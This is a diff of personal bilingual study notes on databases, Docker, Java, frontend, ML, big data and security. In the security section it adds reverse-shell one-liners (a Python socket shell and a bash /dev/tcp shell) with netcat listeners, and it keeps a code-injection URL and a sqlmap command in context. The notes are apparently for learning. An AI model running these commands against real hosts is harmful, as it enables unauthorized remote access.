@@ -202,7 +202,7 @@ date: 2019-05-13 14:42:09
       - 将最短路径中边在图中去掉，然后再求一次最小生成树
 
 
-# 数据库
+# 数据库DB
 - SQL
   - truncate删除表中数据，再插入时自增长id又从1开始
   - [MySQL](https://dev.mysql.com/downloads/)
@@ -605,6 +605,11 @@ Also known as Read-Copy-Update (RCU) in Linux
   - show processlist
   - innodb_f
   - sync_binlog x_commit
+- Error
+  - Hana
+    - Result set is positioned after last row.
+      - because rs.next() returns a boolean value which represents the presence or absence of a row.
+
 
 # CS
 - 架构
@@ -1052,6 +1057,13 @@ Also known as Read-Copy-Update (RCU) in Linux
     - none 模式
   - [docker compose](https://docs.docker.com/compose/):  同时起好几个docker，并相互协作
     - docker-compose.yml
+    - Ubuntu下载： 
+    ```sh
+    curl -L https://github.com/docker/compose/releases/download/1.29.2/docker-compose-`uname -s`-`uname -m` > ./docker-compose
+    ```
+    - chmod +x /usr/local/bin/docker-compose
+    - docker-compose --version
+    - docker-compose up -d
 - etcd
 - BASE（反ACID）
   - 牺牲高一致性，获得可用性或可靠性
@@ -1154,6 +1166,8 @@ Also known as Read-Copy-Update (RCU) in Linux
     - 双亲委派原则
       - 可以避免重复加载
       - 安全
+- SPI机制
+  - https://pdai.tech/md/java/advanced/java-advanced-spi.html
 - concurrent 包
 - lambda表达式
   - stream API
@@ -1346,8 +1360,10 @@ Also known as Read-Copy-Update (RCU) in Linux
 - jupyter
   - 调出: jupyter notebook
 - dateutil.parser.parse('2001-JAN-01')
-
-
+- gtk+
+  - brew install gtk+
+  - brew install --build-from-source gtk+
+  - gtk-launch --version
 # PHP
 - [online editor](https://www.jdoodle.com/php-online-editor/)
 - require vs include: require 没有会报错
@@ -1629,6 +1645,36 @@ Also known as Read-Copy-Update (RCU) in Linux
 - MVC
   - [手写简化逻辑的代码](https://github.com/fanjingdan012/simple-spring-mvc)
 
+# 前端
+- HTML
+- CSS
+  - Sass
+  - Windicss
+- JS
+  - TypeScript
+  - React
+    - React Hooks
+  - ES6
+    - async
+    - promise
+    - symbol
+    - reflect
+    - blob
+  - nodejs
+    - express
+  - webpack
+    - 性能优化
+  - next.js 服务端渲染技术
+  - EventLoop浏览器渲染原理
+  - Lodash常用API的实现
+  - 并发控制
+  
+  - 视频网站前端
+    - WebRTC 实现直播功能
+    - canvas实现视频弹幕，socket实现实时弹幕
+    - 懒加载，防抖节流进行性能优化
+  - Other
+    - https://iotjs.net
 # 软件工程
   - OO三大基本特性 *l1:面向对象的三大基本特性是什么？*
     - 封装
@@ -1708,7 +1754,9 @@ Also known as Read-Copy-Update (RCU) in Linux
   - [code](https://github.com/fanjingdan012/ai-learn/tree/master/BP)
 - 粗糙集
   - [code](https://github.com/fanjingdan012/ai-learn/tree/master/rough-set)
-- 自然语言处理
+- 自然语言处理NLP
+  - RNN
+  - Transformer取代RNN
 - 分类
 - 时间序列分析
   - 时间序列基本规则法-周期因子法
@@ -1725,7 +1773,12 @@ Also known as Read-Copy-Update (RCU) in Linux
   - Facebook-prophet，类似于STL分解思路
   - 深度学习网络，结合CNN+RNN+Attention，作用各不相同互相配合
   - 将时间序列转化为图像，再应用基于卷积神经网络的模型做分析
-
+- 图片处理
+  - Transformer
+  - 图神经网络GNNs
+- lib
+  - PyTorch
+  - TensorFlow
 # 大数据
 - [Hadoop](https://hadoop.apache.org/)
   - HBase
@@ -1768,7 +1821,11 @@ Also known as Read-Copy-Update (RCU) in Linux
     - 分区之间有依赖
     - 可选：对于键值对有一个partitioner（e.g.hash partitioner）
     - 可选：每一个分区有一串优先位置
-
+- 秒杀
+  - 产品页QPS提高：second-level cache built by Guava Cache+Redis
+  - Redis cache and RocketMQ transactional messages are used to asynchronously deduct inventory. The TPS for ordering operations is improved, and the final consistency of inventory data is ensured.
+  - 削峰 token+gate+queue.
+  - token bucket algorithm 限流
 # [网络](https://fanjingdan012.github.io/2019/05/09/Net)
 - 五层协议 *l1: 网络五层、OSI七层协议是什么？*
   - 物理层
@@ -2281,7 +2338,6 @@ Also known as Read-Copy-Update (RCU) in Linux
 
     - eval
       - `https://bugacademy.xsec.sap.corp/web/code_injection/1.php?cmd=echo%28file_get_contents%28%271bflag.txt%27%29%29%3B&level=1`
-
   - sql injection
     - [sqlmap](http://sqlmap.org/)
       - `~/opt/anaconda3/bin/python sqlmap.py -u http://robokracy.com:18443/admin.php --batch --banner`
@@ -2317,7 +2373,18 @@ Also known as Read-Copy-Update (RCU) in Linux
       - 改高度
     - 小色差
   - xml攻击
-  - reverse shell
+  - [reverse shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+    - mac
+      - attacker: `nc -lv 19985`
+      - victim: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",19985));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+    - ubuntu
+      - set up ubuntu docker on mac:
+        - `docker run -itd my-ubuntu` 
+        - `docker exec -it 063554f2f bash`
+      - attacker: `nc -lvp 19985`
+      - victim: `bash -i >& /dev/tcp/a.b.c.d/19985 0>&1`
+  - port forwarding
+    - 
 - test and defend
   - pentest
     - tools
@@ -2509,6 +2576,8 @@ Also known as Read-Copy-Update (RCU) in Linux
       - `git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting`
     - zsh-autosuggestions
       - `git clone https://github.com/zsh-users/zsh-autosuggestions.git ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions`
+    - git
+      - [command shortcuts](https://fanjingdan012.github.io/2022/08/02/Oh-my-zsh-plugin-git-shortcuts)
 - autojump
   - `brew install autojump`
   - `j <dirName>`
@@ -2617,6 +2686,12 @@ Also known as Read-Copy-Update (RCU) in Linux
   - [googler](https://github.com/jarun/googler)
   - [BinGoo](https://www.geeksforgeeks.org/bingoo-linux-bash-based-bing-and-google-dorking-tool/)
   - [Wikit](https://www.tecmint.com/wikipedia-commandline-tool/)
+- 端口转发port forwarding
+  - sudo vim /etc/pf.conf
+  - 在 rdr-anchor "com.apple/*" 下，加上：rdr on lo0 inet proto tcp from any to 127.0.0.1 port 80 -> 127.0.0.1 port 8080
+  - 重新加载配置：sudo pfctl -f /etc/pf.conf
+  - 启动：sudo pfctl -e
+
 
 # Windows
 - 查看pid `wmic process get name, processid|findstr 27284`
